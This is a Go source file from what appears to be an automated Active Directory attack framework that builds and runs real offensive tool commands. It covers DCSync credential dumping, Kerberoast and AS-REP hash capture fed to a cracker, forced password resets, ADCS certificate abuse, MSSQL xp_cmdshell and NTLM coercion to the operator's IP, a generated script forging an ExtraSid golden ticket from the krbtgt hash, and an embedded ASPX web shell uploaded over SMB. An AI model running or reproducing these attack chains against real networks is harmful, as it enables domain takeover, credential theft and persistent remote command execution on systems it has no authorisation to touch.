package modules

import (
	"bytes"
	"context"
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"net"
	"os"
	"os/exec"
	"regexp"
	"strings"
	"time"

	"adpack/core"
	"adpack/tools"
)

func randomPass() string {
	b := make([]byte, 16)
	rand.Read(b)
	return "Chngd_" + hex.EncodeToString(b)
}

// HashCred represents a captured hash credential with its type for hashcat.
type HashCred struct {
	HashType string `json:"hash_type"`
	Hash     string `json:"hash"`
	Username string `json:"username,omitempty"`
	Domain   string `json:"domain,omitempty"`
}

var krb5tgsRe = regexp.MustCompile(`(?m)\$krb5tgs\$23\$[*].*$`)
var krb5asrepRe = regexp.MustCompile(`(?m)\$krb5asrep\$23\$[*].*$`)

// ParseKerberoastOutput extracts $krb5tgs$23$ hashes from impacket-GetUserSPNs stdout.
func ParseKerberoastOutput(stdout string) []HashCred {
	matches := krb5tgsRe.FindAllString(stdout, -1)
	seen := make(map[string]bool)
	var out []HashCred
	for _, m := range matches {
		if seen[m] {
			continue
		}
		seen[m] = true
		out = append(out, HashCred{HashType: "krb5tgs", Hash: m})
	}
	return out
}

// ParseASREPOutput extracts $krb5asrep$23$ hashes from impacket-GetNPUsers stdout.
func ParseASREPOutput(stdout string) []HashCred {
	matches := krb5asrepRe.FindAllString(stdout, -1)
	seen := make(map[string]bool)
	var out []HashCred
	for _, m := range matches {
		// Extract the hash value (everything after the last $)
		hashVal := m
		if idx := strings.LastIndex(m, "$"); idx >= 0 {
			hashVal = m[idx+1:]
		}
		if seen[hashVal] {
			continue
		}
		seen[hashVal] = true
		out = append(out, HashCred{HashType: "krb5asrep", Hash: m})
	}
	return out
}

var ntlmHashRe = regexp.MustCompile(`(\S+):(\d+):([a-f0-9]{32}):([a-f0-9]{32}):::`)

// ParseNTLMOutput extracts NTLM hashes from nxc --sam/--lsa or impacket-secretsdump stdout.
func ParseNTLMOutput(stdout string) []HashCred {
	seen := make(map[string]bool)
	var out []HashCred
	for _, match := range ntlmHashRe.FindAllStringSubmatch(stdout, -1) {
		username := match[1]
		nthash := match[4]
		// Skip NTLMSTUB and empty password hash
		if nthash == "aad3b435b51404eeaad3b435b51404ee" || nthash == "31d6cfe0d16ae931b73c59d7e0c089c0" {
			continue
		}
		if seen[nthash] {
			continue
		}
		seen[nthash] = true
		out = append(out, HashCred{HashType: "ntlm", Hash: nthash, Username: username})
	}
	return out
}

// DispatchResult wraps the output of a real tool execution alongside the
// executor's predicted delta, ready for reconciliation.
type DispatchResult struct {
	ToolOutput    string
	ExitCode      int
	Predicted     core.ExecutionResult
	Capability    core.Capability
	Edge          core.PrivilegeEdge
	Hashes        []HashCred
	GeneratedPass string // popuplated for force_change_password
}

// ExecuteAndReconcile runs the real tool for a given capability on an edge,
// reconciles the output against the executor's predicted delta, then
// runs a post-action LDAP state verification.
//
// Heuristic failure (tool crash, wrong output) blocks the mutation.
// State-verification failure is treated as a CONFIDENCE SIGNAL, not a block
// — the delta is still applied but edges carry degraded confidence so the
// planner naturally deprioritises them.
//
// The caller should always ApplyDelta — the verdict tells you at what
// confidence the edges should be materialised.
func ExecuteAndReconcile(ctx context.Context, edge core.PrivilegeEdge, cap core.Capability, state *core.ADState, domain, user, pass, hash, targetIP string) (ReconVerdict, error) {
	// Dispatch guard: all executor invocation goes through the capability registry.
	// This ensures planner state tracking is never bypassed.
	reg := CapabilityRegistry
	if reg == nil {
		return ReconVerdict{Trustworthy: false, Summary: "no capability registry"}, fmt.Errorf("capability registry not configured")
	}

	exec, status := reg.Resolve(cap)
	if status != core.CapabilityAvailable {
		return ReconVerdict{Trustworthy: false, Summary: fmt.Sprintf("capability %s not available", cap)},
			fmt.Errorf("capability %s not available (status %d)", cap, status)
	}

	predicted := exec.Execute(ctx, edge, state)

	dr, err := dispatchTool(ctx, edge, cap, domain, user, pass, hash, targetIP)
	if err != nil {
		return ReconVerdict{Trustworthy: false, Summary: err.Error()}, err
	}

	// Phase 1: Heuristic output-based reconciliation (hard gate)
	heuristic := ReconcileCrossCheck(predicted, cap, dr.ToolOutput, dr.ExitCode)
	if !heuristic.Trustworthy {
		return heuristic, nil
	}

	// Phase 2: State-grounded LDAP verification (confidence signal)
	stateResult := VerifyState(ctx, edge, cap, domain, user, pass, dr.GeneratedPass, targetIP)
	if !stateResult.Passed {
		// Degrade confidence on all predicted edges rather than blocking
		for i := range predicted.Delta.NewEdges {
			predicted.Delta.NewEdges[i].DegradeConfidence(stateResult.Confidence, "state_verification")
		}
		for i := range predicted.Delta.RemovedEdges {
			_ = i
		}
		return ReconVerdict{
			Trustworthy: true,
			Confidence:  stateResult.Confidence,
			Summary:     fmt.Sprintf("state verify failed — edges degraded (conf=%.2f): %s", stateResult.Confidence, stateResult.Evidence),
			Mismatches: []ReconMismatch{{
				Field: "state_ground", Expected: "confirmed", Actual: stateResult.Evidence,
			}},
		}, nil
	}

	// Mark predicted edges as state-verified
	for i := range predicted.Delta.NewEdges {
		predicted.Delta.NewEdges[i].MarkVerified(stateResult.Confidence, stateResult.Evidence)
	}

	return ReconVerdict{
		Trustworthy: true,
		Confidence:  stateResult.Confidence,
		Summary:     fmt.Sprintf("reconciled + state-grounded: %s", stateResult.Evidence),
	}, nil
}

// dispatchTool runs the real command-line tool for the given capability.
func dispatchTool(ctx context.Context, edge core.PrivilegeEdge, cap core.Capability, domain, user, pass, hash, targetIP string) (DispatchResult, error) {
	fmt.Printf("[dispatch] capability=%s edge=%s→%s\n", cap, edge.SourcePrincipal, edge.TargetPrincipal)
	dCtx, cancel := context.WithTimeout(ctx, 120*time.Second)
	defer cancel()

	cmd, cleanup, err := buildCommand(dCtx, edge, cap, domain, user, pass, hash, targetIP)
	if err != nil {
		return DispatchResult{}, err
	}
	if cleanup != nil {
		defer cleanup()
	}

	capLower := strings.ToLower(string(cap))
	generatedPass := ""
	if strings.Contains(capLower, "force_change_password") {
		generatedPass = randomPass()
		if len(cmd.Args) > 0 {
			cmd.Args[len(cmd.Args)-1] = generatedPass
		}
	}

	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr
	exitCode := 0

	err = cmd.Run()
	select {
	case <-dCtx.Done():
		return DispatchResult{}, dCtx.Err()
	default:
	}

	if err != nil {
		if exitErr, ok := err.(*exec.ExitError); ok {
			exitCode = exitErr.ExitCode()
		} else {
			return DispatchResult{}, fmt.Errorf("tool execution failed: %w", err)
		}
	}

	output := stdout.String()
	if stderr.Len() > 0 {
		if output != "" {
			output += "\n" + stderr.String()
		} else {
			output = stderr.String()
		}
	}

	// Resolve the executor to get predicted delta
	reg := CapabilityRegistry
	var predicted core.ExecutionResult
	if reg != nil {
		if exec, status := reg.Resolve(cap); status == core.CapabilityAvailable {
			predicted = exec.Execute(ctx, edge, &core.ADState{})
		}
	}

	// Parse hashes from output based on capability
	var hashes []HashCred
	switch {
	case strings.Contains(capLower, "kerberoast"):
		hashes = ParseKerberoastOutput(output)
	case strings.Contains(capLower, "asrep_roast"):
		hashes = ParseASREPOutput(output)
	case strings.Contains(capLower, "dcsync") || strings.Contains(capLower, "unconstrained"):
		hashes = ParseNTLMOutput(output)
	}

	// Bridge: feed captured hashes into the cracker pipeline
	for _, h := range hashes {
		if EnqueueHash != nil {
			EnqueueHash(h.HashType, h.Hash, h.Username, "")
		}
	}

	return DispatchResult{
		ToolOutput:    output,
		ExitCode:      exitCode,
		Predicted:     predicted,
		Capability:    cap,
		Edge:          edge,
		Hashes:        hashes,
		GeneratedPass: generatedPass,
	}, nil
}

// buildCommand constructs the exec.Cmd for a capability + edge with context
// for timeout enforcement.
func buildCommand(ctx context.Context, edge core.PrivilegeEdge, cap core.Capability, domain, user, pass, hash, targetIP string) (*exec.Cmd, func(), error) {
	source := edge.SourcePrincipal
	if idx := strings.Index(source, "\\"); idx >= 0 {
		source = source[idx+1:]
	}
	target := edge.TargetPrincipal
	if idx := strings.Index(target, "\\"); idx >= 0 {
		target = target[idx+1:]
	}

	capLower := strings.ToLower(string(cap))

	switch {
	case strings.Contains(capLower, "add_member"):
		args := []string{
			"--host", targetIP, "-d", domain,
			"-u", user, "-p", pass,
			"add", "groupMember", target, source,
		}
		return exec.CommandContext(ctx, "bloodyAD", args...), nil, nil

	case strings.Contains(capLower, "force_change_password"):
		newPass := "P@ssw0rd_Changed_2026!"
		args := []string{
			"--host", targetIP, "-d", domain,
			"-u", user, "-p", pass,
			"set", "password", target, newPass,
		}
		return exec.CommandContext(ctx, "bloodyAD", args...), nil, nil

	case strings.Contains(capLower, "write_dacl"):
		args := []string{
			"--host", targetIP, "-d", domain,
			"-u", user, "-p", pass,
			"add", "genericAll", target, source,
		}
		return exec.CommandContext(ctx, "bloodyAD", args...), nil, nil

	case strings.Contains(capLower, "generic_all"):
		args := []string{
			"--host", targetIP, "-d", domain,
			"-u", user, "-p", pass,
			"add", "genericAll", target, source,
		}
		return exec.CommandContext(ctx, "bloodyAD", args...), nil, nil

	case strings.Contains(capLower, "dcsync"):
		targetStr := fmt.Sprintf("%s/%s:%s@%s", domain, user, pass, targetIP)
		args := []string{targetStr, "-just-dc", "-dc-ip", targetIP}
		return exec.CommandContext(ctx, "impacket-secretsdump", args...), nil, nil

	case strings.Contains(capLower, "cert_auth"):
		args := []string{
			"req", "-u", fmt.Sprintf("%s@%s", user, domain),
			"-p", pass, "-dc-ip", targetIP,
			"-template", "User",
		}
		return exec.CommandContext(ctx, "certipy-ad", args...), nil, nil

	case strings.Contains(capLower, "rbcd"):
		args := []string{
			"--host", targetIP, "-d", domain,
			"-u", user, "-p", pass,
			"add", "rbcd", target, source,
		}
		return exec.CommandContext(ctx, "bloodyAD", args...), nil, nil

	case strings.Contains(capLower, "shadow_cred"):
		args := []string{
			"-d", domain, "-u", user,
			"-p", pass, "--target", target,
			"--action", "add", "--dc-ip", targetIP,
		}
		return exec.CommandContext(ctx, "pywhisker", args...), nil, nil

	case strings.Contains(capLower, "kerberoast"):
		args := []string{
			fmt.Sprintf("%s/%s:%s", domain, user, pass),
			"-request", "-dc-ip", targetIP,
		}
		return exec.CommandContext(ctx, "impacket-GetUserSPNs", args...), nil, nil

	case strings.Contains(capLower, "asrep_roast"):
		args := []string{
			fmt.Sprintf("%s/%s:%s", domain, user, pass),
			"-request", "-dc-ip", targetIP,
		}
		return exec.CommandContext(ctx, "impacket-GetNPUsers", args...), nil, nil

	case strings.Contains(capLower, "ldap_spray"):
		args := []string{
			targetIP, "-d", domain, "-u", user,
			"-p", pass, "--continue-on-success",
		}
		return exec.CommandContext(ctx, "nxc", append([]string{"ldap"}, args...)...), nil, nil

	case strings.Contains(capLower, "unconstrained_delegation"):
		targetStr := fmt.Sprintf("%s/%s@%s", domain, user, targetIP)
		args := []string{"-k", "-no-pass", "-dc-ip", targetIP, targetStr}
		return exec.CommandContext(ctx, "impacket-secretsdump", args...), nil, nil

	case strings.Contains(capLower, "mssql_impersonate"):
		args := []string{
			targetIP, "-d", domain, "-u", user,
			"-p", pass, "-M", "mssql_priv", "-o", "ACTION=privesc",
		}
		return exec.CommandContext(ctx, "nxc", append([]string{"mssql"}, args...)...), nil, nil

	case strings.Contains(capLower, "mssql_sysadmin"):
		args := []string{
			targetIP, "-d", domain, "-u", user,
			"-p", pass, "-M", "enable_cmdshell",
		}
		return exec.CommandContext(ctx, "nxc", append([]string{"mssql"}, args...)...), nil, nil

	case strings.Contains(capLower, "mssql_xp_cmdshell"):
		args := []string{
			targetIP, "-d", domain, "-u", user,
			"-p", pass, "-q", "xp_cmdshell 'whoami'",
		}
		return exec.CommandContext(ctx, "nxc", append([]string{"mssql"}, args...)...), nil, nil

	case strings.Contains(capLower, "mssql_execute_as_user"):
		args := []string{
			targetIP, "-d", domain, "-u", user,
			"-p", pass, "-M", "mssql_priv", "-o", "ACTION=privesc",
		}
		return exec.CommandContext(ctx, "nxc", append([]string{"mssql"}, args...)...), nil, nil

	case strings.Contains(capLower, "mssql_ntlm_coerce"):
		args := []string{
			targetIP, "-d", domain, "-u", user,
			"-p", pass, "-M", "mssql_coerce", "-o", "LISTENER=" + localIP(),
		}
		return exec.CommandContext(ctx, "nxc", append([]string{"mssql"}, args...)...), nil, nil

	case strings.Contains(capLower, "mssql_linked_server"):
		linkedName := edge.TargetPrincipal
		args := []string{
			targetIP, "-d", domain, "-u", user,
			"-p", pass, "-M", "link_xpcmd", "-o", "LINKED_SERVER=" + linkedName, "-o", "CMD=whoami",
		}
		return exec.CommandContext(ctx, "nxc", append([]string{"mssql"}, args...)...), nil, nil

	case strings.Contains(capLower, "targeted_kerberoast"):
		rs, err := tools.RandString(6)
		if err != nil {
			return nil, nil, fmt.Errorf("randstring: %w", err)
		}
		spnVal := "HTTP/" + rs
		args := []string{
			"--host", targetIP, "-d", domain,
			"-u", user, "-p", pass,
			"set", "object", target, "servicePrincipalName", "-v", spnVal,
		}
		return exec.CommandContext(ctx, "bloodyAD", args...), nil, nil

	case strings.Contains(capLower, "adcs_esc4"):
		args := []string{
			"template", "-u", fmt.Sprintf("%s@%s", user, domain),
			"-p", pass, "-dc-ip", targetIP,
			"-template", target, "-save-old",
		}
		return exec.CommandContext(ctx, "certipy-ad", args...), nil, nil

	case strings.Contains(capLower, "adcs_esc7"):
		args := []string{
			"ca", "-ca", target, "-add-officer", user,
			"-u", fmt.Sprintf("%s@%s", user, domain),
			"-p", pass, "-dc-ip", targetIP,
		}
		return exec.CommandContext(ctx, "certipy-ad", args...), nil, nil

	case strings.Contains(capLower, "krb_relay_up"):
		rs2, _ := tools.RandString(12)
		script := fmt.Sprintf(`#!/bin/bash
set -e
DOMAIN=%q
USER=%q
PASS=%q
DC=%q
TARGET=%q
COMPNAME="KRB%d$"
COMPPASS="%s"

addcomputer.py -computer-name "$COMPNAME" -computer-pass "$COMPPASS" "$DOMAIN/$USER:$PASS" -dc-ip "$DC"
rbcd.py -delegate-from "$COMPNAME" -delegate-to "$TARGET" -action write "$DOMAIN/$USER:$PASS" -dc-ip "$DC"
getST.py -spn "cifs/$TARGET" -impersonate Administrator -dc-ip "$DC" "$DOMAIN/$COMPNAME:$COMPPASS"
echo "KRBRELAY_SUCCESS"
`, domain, user, pass, targetIP, targetIP, time.Now().UnixNano()%100000, rs2)
		scriptPath := "/tmp/adpack_krbrelay.sh"
		if err := os.WriteFile(scriptPath, []byte(script), 0755); err != nil {
			return nil, nil, fmt.Errorf("write krbrelay script: %w", err)
		}
		cleanup := func() { os.Remove(scriptPath) }
		return exec.CommandContext(ctx, "bash", scriptPath), cleanup, nil

	case strings.Contains(capLower, "s4u_delegation"):
		hostPart := edge.TargetPrincipal
		if idx := strings.LastIndex(hostPart, `\`); idx >= 0 {
			hostPart = hostPart[idx+1:]
		}
		hostPart = strings.TrimRight(hostPart, "$")
		spn := fmt.Sprintf("cifs/%s.%s", hostPart, domain)
		auth := buildImpacketAuth(domain, user, pass, hash, targetIP)
		args := []string{
			"-spn", spn,
			"-impersonate", "Administrator",
			"-dc-ip", targetIP,
			auth,
		}
		if hash != "" && pass == "" {
			args = append([]string{"-hashes", ":" + hash}, args...)
		}
		return exec.CommandContext(ctx, "impacket-getST", args...), nil, nil

	case strings.Contains(capLower, "extra_sid_golden_ticket"):
		// Multi-step ExtraSid trust escalation:
		//   1. impacket-secretsdump -just-dc-user krbtgt <child_dc>
		//   2. impacket-lookupsid <child_dc> 0 → child domain SID
		//   3. impacket-lookupsid <parent_dc> 0 → parent domain SID + EA RID 519
		//   4. impacket-ticketer -sid-history <parent_EA_SID> ...
		//
		// We write a temp shell script because the chain involves multiple tools
		// that share state (krbtgt hash, domain SIDs). The script emits a
		// TICKET_SUCCESS: line on completion for the reconciliation layer.
		childDomain := domain
		parts := strings.SplitN(childDomain, ".", 2)
		parentDomain := childDomain
		if len(parts) == 2 {
			parentDomain = parts[1]
		}
		childDC := targetIP

		// Build the multi-step script
		script := fmt.Sprintf(`#!/bin/bash
set -euo pipefail
CHILD_DOMAIN=%q
PARENT_DOMAIN=%q
CHILD_DC=%q
USER=%q
PASS=%q
HASH=%q
TS=$(date +%%s)
FAKE_USER="svc_trust_${TS}"

build_auth() {
  local d=$1 h=$2 dc=$3 u=$4 p=$5
  if [ -n "$h" ]; then
    echo "${d}/${u}@${dc}"
  else
    echo "${d}/${u}:${p}@${dc}"
  fi
}

hash_args() {
  local h=$1
  if [ -n "$h" ]; then
    echo "-hashes :${h}"
  fi
}

AUTH=$(build_auth "$CHILD_DOMAIN" "$HASH" "$CHILD_DC" "$USER" "$PASS")
HASH_ARGS=$(hash_args "$HASH")

# Step 1: secretsdump krbtgt
echo "=== STEP 1: secretsdump krbtgt ==="
SD_OUT=$(impacket-secretsdump "$AUTH" -just-dc-user krbtgt $HASH_ARGS 2>&1)
echo "$SD_OUT"
KRBTGT_HASH=$(echo "$SD_OUT" | grep -oP "(?<=^krbtgt:\d+:)[a-fA-F0-9]{32}" | tail -1)
if [ -z "$KRBTGT_HASH" ]; then
  echo "EXTRASID_FAIL: could not extract krbtgt hash"
  exit 1
fi
echo "KRBTGT_HASH=${KRBTGT_HASH}"

# Step 2: lookupsid child domain
echo "=== STEP 2: lookupsid child domain ==="
LS_OUT=$(impacket-lookupsid "$AUTH" 0 $HASH_ARGS 2>&1)
echo "$LS_OUT"
CHILD_SID=$(echo "$LS_OUT" | grep -oP "Domain SID is:\s*\K(S-1-5-21-\d+-\d+-\d+)")
if [ -z "$CHILD_SID" ]; then
  echo "EXTRASID_FAIL: could not extract child domain SID"
  exit 1
fi
echo "CHILD_SID=${CHILD_SID}"

# Step 3: resolve parent DC + lookupsid parent domain
echo "=== STEP 3: lookupsid parent domain ==="
# Try DNS SRV resolution for parent DC; fall back to guessing
PARENT_DC=$(host -t SRV _ldap._tcp.dc._msdcs.${PARENT_DOMAIN} 2>/dev/null | grep -oP "\S+\.${PARENT_DOMAIN}\." | head -1 | sed "s/\.$//")
if [ -z "$PARENT_DC" ]; then
  PARENT_DC=$(echo "$PARENT_DOMAIN" | cut -d. -f1)
fi
echo "PARENT_DC=${PARENT_DC}"

PARENT_AUTH=$(build_auth "$PARENT_DOMAIN" "$HASH" "$PARENT_DC" "$USER" "$PASS")
PLS_OUT=$(impacket-lookupsid "$PARENT_AUTH" 0 $HASH_ARGS 2>&1)
echo "$PLS_OUT"
PARENT_SID=$(echo "$PLS_OUT" | grep -oP "Domain SID is:\s*\K(S-1-5-21-\d+-\d+-\d+)")
if [ -z "$PARENT_SID" ]; then
  echo "EXTRASID_FAIL: could not extract parent domain SID"
  exit 1
fi
PARENT_EA_SID="${PARENT_SID}-519"
echo "PARENT_SID=${PARENT_SID}"
echo "PARENT_EA_SID=${PARENT_EA_SID}"

# Step 4: forge golden ticket with SID history
echo "=== STEP 4: impacket-ticketer with SID history ==="
TK_OUT=$(impacket-ticketer -nthash "$KRBTGT_HASH" -domain-sid "$CHILD_SID" -domain "$CHILD_DOMAIN" -sid-history "$PARENT_EA_SID" "$FAKE_USER" 2>&1)
echo "$TK_OUT"
CCACHE_FILE="/tmp/extra_sid_${FAKE_USER}.ccache"
mv "${FAKE_USER}.ccache" "$CCACHE_FILE" 2>/dev/null || true
if [ -f "$CCACHE_FILE" ]; then
  echo "TICKET_SUCCESS:${FAKE_USER}@${CHILD_DOMAIN}"
  echo "CCACHE:${CCACHE_FILE}"
  echo "SID_HISTORY:${PARENT_EA_SID}"
  echo "USE: export KRB5CCNAME=${CCACHE_FILE}"
else
  echo "EXTRASID_FAIL: ticket file not created"
  exit 1
fi
`, childDomain, parentDomain, childDC, user, pass, hash)

		scriptPath := "/tmp/adpack_extrasid.sh"
		if err := os.WriteFile(scriptPath, []byte(script), 0755); err != nil {
			return nil, nil, fmt.Errorf("write extrasid script: %w", err)
		}
		cleanup := func() { os.Remove(scriptPath) }
		return exec.CommandContext(ctx, "bash", scriptPath), cleanup, nil

	case strings.Contains(capLower, "webshell_upload"):
		tmpFile, err := os.CreateTemp("", "adpack-webshell-*.aspx")
		if err != nil {
			return nil, nil, fmt.Errorf("create temp webshell: %w", err)
		}
		webshellContent := `<%@Page Language="C#"%><%if(Request.Form["cmd"]!=null){System.Diagnostics.Process p=new System.Diagnostics.Process();p.StartInfo.FileName="cmd.exe";p.StartInfo.Arguments="/c "+Request.Form["cmd"];p.StartInfo.UseShellExecute=false;p.StartInfo.RedirectStandardOutput=true;p.StartInfo.RedirectStandardError=true;p.Start();Response.Write(p.StandardOutput.ReadToEnd()+p.StandardError.ReadToEnd());}%>`
		if _, err := tmpFile.WriteString(webshellContent); err != nil {
			tmpFile.Close()
			os.Remove(tmpFile.Name())
			return nil, nil, fmt.Errorf("write temp webshell: %w", err)
		}
		tmpFile.Close()
		webshellCleanup := func() { os.Remove(tmpFile.Name()) }

		uploadDir := `C:\inetpub\wwwroot\upload\`
		remotePath := uploadDir + "shell.aspx"
		args := []string{"smb", targetIP}
		if domain != "" {
			args = append(args, "-d", domain)
		}
		if user != "" {
			args = append(args, "-u", user)
		}
		if pass != "" {
			args = append(args, "-p", pass)
		}
		if hash != "" {
			args = append(args, "-H", hash)
		}
		args = append(args, "--put-file", tmpFile.Name(), remotePath)
		return exec.CommandContext(ctx, "netexec", args...), webshellCleanup, nil

	default:
		return nil, nil, fmt.Errorf("no tool dispatch for capability %s", cap)
	}
}

func localIP() string {
	ifaces, err := net.Interfaces()
	if err != nil {
		return "127.0.0.1"
	}
	for _, iface := range ifaces {
		if iface.Flags&net.FlagLoopback != 0 {
			continue
		}
		addrs, err := iface.Addrs()
		if err != nil {
			continue
		}
		for _, addr := range addrs {
			ipnet, ok := addr.(*net.IPNet)
			if !ok {
				continue
			}
			if ipnet.IP.To4() != nil {
				return ipnet.IP.String()
			}
		}
	}
	return "127.0.0.1"
}
